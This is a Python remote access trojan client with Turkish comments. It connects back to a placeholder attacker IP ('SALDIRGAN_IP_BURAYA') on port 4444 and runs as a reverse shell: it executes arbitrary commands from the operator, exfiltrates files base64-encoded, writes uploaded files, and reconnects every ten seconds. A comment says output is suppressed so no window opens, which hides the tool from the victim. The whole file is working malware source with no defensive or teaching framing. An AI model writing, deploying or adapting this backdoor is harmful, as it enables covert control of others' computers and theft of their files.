import socket
import subprocess
import os
import json
import base64
import time
import sys

class RatClient:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            # DEVNULL kullanımı pencere açılmasını ve görünürlüğü engeller
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL).decode("cp857")
        except Exception as e:
            return f"[-] Komut hatası: {str(e)}"

    def change_directory(self, path):
        os.chdir(path)
        return f"[+] Dizin değiştirildi: {os.getcwd()}"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Dosya başarıyla yüklendi."

    def run(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                
                while True:
                    command = self.reliable_receive()
                    try:
                        if command[0] == "exit":
                            self.connection.close()
                            sys.exit()
                        elif command[0] == "cd" and len(command) > 1:
                            result = self.change_directory(command[1])
                        elif command[0] == "download":
                            result = self.read_file(command[1])
                        elif command[0] == "upload":
                            result = self.write_file(command[1], command[2])
                        else:
                            result = self.execute_system_command(" ".join(command))
                    except Exception as e:
                        result = f"[-] Hata: {str(e)}"

                    self.reliable_send(result)
            except Exception:
                # Bağlantı koparsa 10 saniye bekle ve tekrar dene
                time.sleep(10)

my_rat = RatClient("SALDIRGAN_IP_BURAYA", 4444)
my_rat.run()